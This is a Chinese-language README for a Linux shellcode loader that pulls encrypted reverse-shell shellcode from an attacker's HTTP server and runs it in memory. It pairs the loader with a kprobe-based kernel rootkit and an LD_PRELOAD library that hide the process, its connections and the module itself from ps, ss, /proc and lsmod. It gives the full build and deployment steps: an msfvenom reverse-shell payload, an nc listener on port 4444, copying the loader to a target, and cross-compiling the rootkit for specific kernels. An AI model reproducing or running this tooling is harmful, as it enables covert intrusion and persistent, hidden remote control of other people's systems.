# Linux Shellcode Loader — 纯内存远程加载与全系统隐藏

## 概述

从远程 HTTP 服务器拉取加密 shellcode，内存解密后执行。通过内核 rootkit + 用户态 hide_lib.so 实现进程、网络连接的全系统隐藏。

**核心特性：**
- shellcode 全程不落盘：HTTP → 内存解密 → mmap 执行
- rootkit 内核模块：全系统进程隐藏、连接隐藏、信号保护
- rootkit 加载后自动从 lsmod 隐藏
- 预编译 .ko 自动匹配目标内核版本（HTTP 拉取）
- hide_lib.so 用户态 hook（非 root 模式下使用）
- 纯 kprobe 实现，无 sys_call_table 修改，兼容 kernel lockdown

## 模块功能

```
┌─────────────────────────────────────────────────────────┐
│                     loader (远程加载器)                   │
│  HTTP GET → SCLD解密 → mmap RW → mprotect RX → 跳转执行  │
├─────────────────────────────────────────────────────────┤
│  rootkit.ko (内核模块)                                   │
│  ├─ openat kprobe        → 阻止 /proc/<pid> 访问        │
│  ├─ getdents64 kretprobe → 过滤 /proc 目录列表           │
│  ├─ kill/tkill/tgkill    → 拦截信号                      │
│  ├─ tcp4_seq_show kprobe → 隐藏 /proc/net/tcp            │
│  ├─ inet_sk_diag_fill    → 隐藏 ss/NETLINK               │
│  └─ 加载后自动 lsmod 隐藏                                │
├─────────────────────────────────────────────────────────┤
│  hide_lib.so (LD_PRELOAD 库)                             │
│  ├─ readdir/readdir64 hook → 过滤 /proc 目录              │
│  ├─ open/openat/fopen hook → 阻止 /proc/<pid>            │
│  ├─ recvmsg/recvfrom hook  → 过滤 ss NETLINK             │
│  ├─ read hook              → 过滤 /proc/net/tcp          │
│  └─ execve 后自动改名 → [kworker/0:0]                    │
└─────────────────────────────────────────────────────────┘
```

## 目录结构

```
loader_project/
├── src/
│   ├── loader.c              # 主加载器 (HTTP拉取+内存执行)
│   ├── hide_lib.c            # LD_PRELOAD 隐藏库
│   ├── rootkit.c             # 内核 rootkit (v14, kprobe-only)
│   └── encrypt_shellcode.c   # shellcode 加密工具
├── build/
│   ├── loader                # 编译好的加载器
│   ├── encrypt               # 加密工具
│   ├── enc_shellcode.bin     # 加密后的 shellcode (HTTP分发)
│   ├── rootkit_5.14.0-687.10.1.el9_8.0.1.x86_64.ko  # Rocky 9
│   └── rootkit_5.15.0-139-generic.ko                 # Ubuntu 20.04
├── rootkit/                  # 预编译内核模块仓库
├── shellcode/
│   └── sc_4444.bin           # 原始反弹shell (192.168.102.167:4444)
├── Makefile
└── README.md
```

## 编译环境

| 组件 | 要求 |
|------|------|
| 操作系统 | Ubuntu 20.04+ / Debian / Rocky 9 |
| 编译器 | gcc, make |
| 内核头文件 | linux-headers-$(uname -r) (本地编译 rootkit 需要) |
| Docker | 交叉编译其他内核版本的 rootkit (可选) |
| Python3 | HTTP 服务器 |
| 工具 | xxd (gcc 编译 hide_lib 需要) |

### 安装编译依赖

```bash
# Ubuntu/Debian
sudo apt install -y gcc make xxd python3 netcat-openbsd docker.io

# Rocky 9
sudo dnf install -y gcc make vim-common python3 docker
```

## 快速开始

### 1. 编译

```bash
cd loader_project
make                          # 编译 loader + hide_lib.so (嵌入)
make build/encrypt            # 编译加密工具
```

### 2. 生成加密 shellcode

```bash
# 使用预置 shellcode (连接 192.168.102.167:4444)
./build/encrypt shellcode/sc_4444.bin build/enc_shellcode.h build/enc_shellcode.bin

# 自定义 shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<你的IP> LPORT=4444 -f raw -o my.bin
./build/encrypt my.bin build/enc_shellcode.h build/enc_shellcode.bin
```

### 3. 编译内核 rootkit

```bash
# === 本机编译 ===
make rootkit
# → rootkit/rootkit_$(uname -r).ko

# === Docker 交叉编译 (Rocky 9) ===
docker run --rm \
  -v $(pwd)/src/rootkit.c:/src/rootkit.c \
  -v $(pwd)/build:/out \
  rockylinux:9 bash -c '
    dnf install -y kernel-devel gcc make elfutils-libelf-devel
    KDIR=$(ls -d /usr/src/kernels/* | head -1)
    VER=$(cat $KDIR/include/generated/utsrelease.h | awk "{print \$3}" | tr -d "\"")
    cd /tmp && cp /src/rootkit.c .
    echo "obj-m += rootkit.o" > Makefile
    make -C $KDIR M=/tmp modules
    cp rootkit.ko /out/rootkit_${VER}.ko
  '

# === Docker 交叉编译 (其他发行版) ===
# 替换 rockylinux:9 为目标发行版的 Docker 镜像
# Debian/Kali: 安装 linux-headers-amd64 包
# Ubuntu: 安装 linux-headers-generic 包
# RHEL/Rocky: 安装 kernel-devel-$(uname -r) 包

# 保存到 rootkit 仓库
cp build/rootkit_*.ko rootkit/
```

### 4. 准备 HTTP 服务文件

```bash
# 将所有 .ko 复制到 build/ 目录
cp rootkit/rootkit_*.ko build/

# build/ 目录应包含:
#   enc_shellcode.bin    - 加密 shellcode
#   rootkit_*.ko         - 各目标内核版本的 rootkit
```

### 5. 部署

```bash
# ===== 攻击机 =====
# 终端A: HTTP 服务器 (提供 shellcode + rootkit)
cd loader_project/build
python3 -m http.server 8080

# 终端B: nc 监听 (接收反弹 shell)
nc -lvnp 4444

# 终端C: 传输 loader 到目标
scp build/loader root@<目标IP>:/tmp/

# ===== 目标机器 =====
# Root 模式 (全系统隐藏):
ssh root@<目标IP>
/tmp/loader -v http://<攻击机IP>:8080/enc_shellcode.bin

# 非 Root 模式 (当前终端隐藏):
chmod +x /tmp/loader
/tmp/loader -v http://<攻击机IP>:8080/enc_shellcode.bin
```

## 验证

```bash
# 获取隐藏的 PID
PID=$(cat /proc/kallmodsmsg | awk '{print $1}')

# Root 模式验证 (所有终端生效):
ls /proc/$PID                     # 应显示 "无法访问"
ps -ef | grep $PID                # 应无输出
kill -0 $PID && echo fail         # 应无输出
kill -9 $PID; ls /proc/$PID       # 进程仍存在
ss -tnp | grep 4444               # 应无输出
cat /proc/net/tcp | grep 4444     # 应无输出
lsmod | grep rootkit              # 应无输出 (已隐藏)
cat /proc/kallmodsmsg             # 确认 PID 和端口

# 非 Root 模式验证 (仅当前终端生效):
# 执行 loader 后进入新 shell, 在该 shell 中:
ps -ef | grep sh                  # 进程名显示 [kworker/0:0]
ss -tnp | grep 4444               # 应无输出
```

## 清理

```bash
# Root 模式 — 模块已从 lsmod 隐藏, 需要重启清除
sudo reboot

# 或其他清理方式:
rm -f /tmp/.h /tmp/loader
```

## 加密格式 (SCLD)

```
┌──────┬─────┬──────┬─────────┬──────────┬──────────┬────────────┐
│ SCLD │ ver │ algo │ keylen  │   key    │  paylen  │ 加密载荷    │
│ 4B   │ 1B  │ 1B   │ 2B LE   │  N bytes │ 4B LE    │  M bytes   │
└──────┴─────┴──────┴─────────┴──────────┴──────────┴────────────┘
```

- `algo=0`: XOR 加密 (16 字节循环密钥)
- `algo=1`: RC4 流密码
- 密钥内嵌在文件中，loader 解析后内存解密

## Shellcode 加密命令

```bash
# XOR 加密 (默认)
./build/encrypt input.bin output.h output.bin

# RC4 加密
./build/encrypt --rc4 input.bin output.h output.bin

# 自定义输入输出
./build/encrypt <原始shellcode> <C头文件> <加密二进制>
```

## 架构说明

### 执行流程

```
攻击机:8080                           目标机
─────────                            ─────
HTTP GET /enc_shellcode.bin  ←── loader 下载加密shellcode到内存
HTTP GET /rootkit_<ver>.ko   ←── init_module() 内存加载rootkit

fork()
  ├─ 子进程: mmap RW → 解密 → mprotect RX → 跳转执行
  │           shellcode: socket→connect→dup2→execve("/bin/sh")
  │           反弹连接到攻击机:4444
  └─ 父进程(root): 加载 rootkit → 写入PID → _exit(0)
      父进程(非root): exec /bin/bash (带 LD_PRELOAD)
```

### 隐藏层次

| 层级 | 技术 | 权限 | 效果 |
|------|------|------|------|
| 1 | prctl + /proc/self/comm | 任意 | 进程名伪装 [kworker/0:0] |
| 2 | hide_lib.so (memfd) | 任意 | 当前终端 ps/ss 过滤 |
| 3 | getdents64 kretprobe | root | 全系统 /proc 目录隐藏 |
| 4 | openat kprobe | root | 阻止直接访问隐藏PID |
| 5 | kill/tkill/tgkill kprobe | root | 信号保护 |
| 6 | tcp4_seq_show kprobe | root | /proc/net/tcp 隐藏 |
| 7 | inet_sk_diag_fill kprobe | root | ss NETLINK 隐藏 |
| 8 | lsmod 隐藏 | root | 模块不可见 |

## 新增目标内核版本

```bash
# 1. 获取目标内核版本
ssh target 'uname -r'
# → 6.1.0-kali7-amd64

# 2. 找到对应 Docker 镜像编译
docker run --rm \
  -v $PWD/src/rootkit.c:/src/rootkit.c \
  -v $PWD/build:/out \
  kalilinux/kali-rolling bash -c '
    apt update && apt install -y linux-headers-6.1.0-kali7-amd64 build-essential
    cd /tmp && cp /src/rootkit.c . && echo "obj-m += rootkit.o" > Makefile
    make -C /usr/src/linux-headers-6.1.0-kali7-amd64 M=/tmp modules
    cp rootkit.ko /out/rootkit_6.1.0-kali7-amd64.ko
  '

# 3. 保存到仓库并复制到 build/
cp build/rootkit_6.1.0-kali7-amd64.ko rootkit/
cp build/rootkit_6.1.0-kali7-amd64.ko build/
```

## 已知限制

| 限制 | 说明 |
|------|------|
| x86_64 only | ARM/aarch64 需要适配寄存器名 |
| kernel lockdown | Ubuntu 5.15+ + SecureBoot 下 signal hook 受限 |
| 非 root 跨终端 | LD_PRELOAD 仅影响当前进程, 其他终端可见 |
| inet_sk_diag_fill | Ubuntu 上为静态符号, kprobe 不可用; Rocky 9 正常 |
| vermagic 匹配 | rootkit.ko 必须匹配目标内核精确版本 |
